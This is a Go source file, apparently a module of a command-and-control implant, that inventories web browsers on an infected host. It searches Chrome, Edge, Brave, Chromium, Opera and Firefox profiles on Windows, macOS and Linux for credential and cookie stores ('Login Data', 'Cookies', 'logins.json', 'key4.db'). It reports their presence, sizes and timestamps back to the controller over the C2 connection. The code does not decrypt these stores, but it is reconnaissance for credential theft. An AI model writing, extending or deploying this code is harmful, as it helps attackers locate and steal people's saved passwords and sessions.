package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"c2-platform/internal/protocol"
)

// Browser inventory reports which browsers, profiles and artifacts exist on the
// host. It reads file metadata and the version file only; no credential store
// is parsed or decrypted.

type browserRoot struct {
	name    string
	path    string
	firefox bool
}

var chromiumFiles = []string{"History", "Bookmarks", "Cookies", "Login Data", "Web Data", "Preferences"}
var firefoxFiles = []string{"places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "prefs.js"}

func browserRoots() []browserRoot {
	home, _ := os.UserHomeDir()
	switch runtime.GOOS {
	case "windows":
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		return []browserRoot{
			{"Chrome", filepath.Join(local, "Google", "Chrome", "User Data"), false},
			{"Edge", filepath.Join(local, "Microsoft", "Edge", "User Data"), false},
			{"Brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"), false},
			{"Chromium", filepath.Join(local, "Chromium", "User Data"), false},
			{"Opera", filepath.Join(roaming, "Opera Software", "Opera Stable"), false},
			{"Firefox", filepath.Join(roaming, "Mozilla", "Firefox", "Profiles"), true},
		}
	case "darwin":
		sup := filepath.Join(home, "Library", "Application Support")
		return []browserRoot{
			{"Chrome", filepath.Join(sup, "Google", "Chrome"), false},
			{"Edge", filepath.Join(sup, "Microsoft Edge"), false},
			{"Brave", filepath.Join(sup, "BraveSoftware", "Brave-Browser"), false},
			{"Chromium", filepath.Join(sup, "Chromium"), false},
			{"Firefox", filepath.Join(sup, "Firefox", "Profiles"), true},
		}
	default:
		cfg := os.Getenv("XDG_CONFIG_HOME")
		if cfg == "" {
			cfg = filepath.Join(home, ".config")
		}
		return []browserRoot{
			{"Chrome", filepath.Join(cfg, "google-chrome"), false},
			{"Chromium", filepath.Join(cfg, "chromium"), false},
			{"Edge", filepath.Join(cfg, "microsoft-edge"), false},
			{"Brave", filepath.Join(cfg, "BraveSoftware", "Brave-Browser"), false},
			{"Firefox", filepath.Join(home, ".mozilla", "firefox"), true},
		}
	}
}

func handleBrowser(c net.Conn) {
	for _, b := range browserRoots() {
		entries, err := os.ReadDir(b.path)
		if err != nil {
			continue
		}
		files := chromiumFiles
		if b.firefox {
			files = firefoxFiles
		}
		for _, e := range entries {
			if !e.IsDir() || strings.HasPrefix(e.Name(), ".") {
				continue
			}
			if !b.firefox && e.Name() != "Default" && !strings.HasPrefix(e.Name(), "Profile") {
				continue
			}
			for _, name := range files {
				info, err := os.Stat(filepath.Join(b.path, e.Name(), name))
				if err != nil || info.IsDir() {
					continue
				}
				browserLine(c, b.name, e.Name(), name, info.Size(), info.ModTime().Unix())
			}
		}
		if !b.firefox {
			if v, err := os.ReadFile(filepath.Join(b.path, "Last Version")); err == nil {
				if s := strings.TrimSpace(string(v)); s != "" {
					browserLine(c, b.name, "-", s, 0, 0)
				}
			}
		}
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

func browserLine(c net.Conn, browser, profile, item string, size, mtime int64) {
	line := fmt.Sprintf("%s\t%s\t%s\t%d\t%d\n", browser, profile, item, size, mtime)
	_ = writeFrame(c, protocol.RspData, []byte(line))
}
